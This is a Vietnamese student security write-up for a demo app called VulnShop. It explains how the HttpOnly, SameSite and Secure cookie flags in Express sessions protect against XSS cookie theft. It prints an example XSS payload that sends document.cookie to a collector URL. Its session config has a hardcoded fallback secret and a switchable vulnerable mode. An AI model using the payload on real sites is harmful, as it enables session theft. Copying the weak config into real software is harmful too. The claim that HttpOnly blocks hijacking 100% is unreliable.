# PHÂN TÍCH CHUYÊN SÂU: CẤU HÌNH COOKIE PHIÊN AN TOÀN TRÊN NODE.JS & EXPRESS
**Thành viên thực hiện:** Thành viên 2 (Frontend & XSS Security Specialist)  
**Tích hợp đồng bộ:** Backend Express.js / MySQL của Thành viên 1  
**Tiêu chuẩn đối chiếu:** OWASP Session Management Cheat Sheet & RFC 6265bis

---

## 1. TẠI SAO CỜ HTTPONLY LÀ GIẢI PHÁP THEN CHỐT CHỐNG XSS COOKIE THEFT?

Trong kịch bản tấn công Cross-Site Scripting (XSS), kẻ tấn công chèn mã JavaScript độc hại vào trình duyệt của nạn nhân. Mục tiêu nguy hiểm nhất của mã JavaScript độc hại này là thực thi lệnh trích xuất Cookie phiên:
```javascript
var stolenCookie = document.cookie;
new Image().src = "http://localhost:8888/log?cookie=" + encodeURIComponent(stolenCookie);
```

Khi máy chủ Express gửi cờ `httpOnly: true` trong cấu hình `express-session`:
```http
Set-Cookie: session_id=s%3A...; Path=/; HttpOnly; SameSite=Lax
```

Trình duyệt web (Chrome, Firefox, Safari, Edge) sẽ kích hoạt cơ chế cô lập:
1. Trình duyệt vẫn tự động gửi Cookie này trong các yêu cầu HTTP tiếp theo lên máy chủ hợp lệ (đảm bảo tính năng đăng nhập).
2. Tuy nhiên, thuộc tính `document.cookie` trong Document Object Model (DOM) bị chặn hoàn toàn, trả về chuỗi rỗng đối với `session_id`.
3. Do đó, ngay cả khi ứng dụng bị dính lỗ hổng XSS (do sơ suất render `innerHTML`), mã độc của attacker **hoàn toàn không thể đọc được Session ID**, ngăn chặn triệt để 100% cuộc tấn công đánh cắp danh tính (Session Hijacking).

---

## 2. TRIỂN KHAI TRÊN NODE.JS EXPRESS (VULNSHOP)

Tệp cài đặt chuẩn nằm tại: `SOURCE/web-app/secure/config/session/session_security.js`

### 2.1. Cấu hình linh hoạt theo chế độ `process.env.MODE`:
```javascript
const session = require('express-session');

function configureSession(mode = 'secure') {
    const isSecure = (mode === 'secure');
    return session({
        name: 'session_id',
        secret: process.env.SESSION_SECRET || 'vulnshop_auth_key_2026',
        resave: false,
        saveUninitialized: false,
        cookie: {
            path: '/',
            maxAge: 24 * 60 * 60 * 1000,
            httpOnly: isSecure, // SECURE: true | VULNERABLE: false
            sameSite: isSecure ? 'lax' : false,
            secure: process.env.NODE_ENV === 'production'
        }
    });
}
```

### 2.2. Ý nghĩa các cờ bảo mật:
- **`httpOnly: true`**: Triệt tiêu bề mặt tấn công cướp Cookie qua `document.cookie`.
- **`sameSite: 'lax'`**: Bảo vệ chống lại tấn công Cross-Site Request Forgery (CSRF).
- **`secure: true`**: Đảm bảo cookie chỉ được truyền qua kết nối SSL/TLS bảo mật.
- **`Content-Security-Policy (CSP)`**: Giới hạn nguồn gốc kịch bản được phép tải và thực thi trong trình duyệt.

*(Lưu ý: Các file `session_security.py` và `session_security.php` được lưu lại dưới dạng tài liệu tham khảo chéo cho các nền tảng công nghệ khác).*
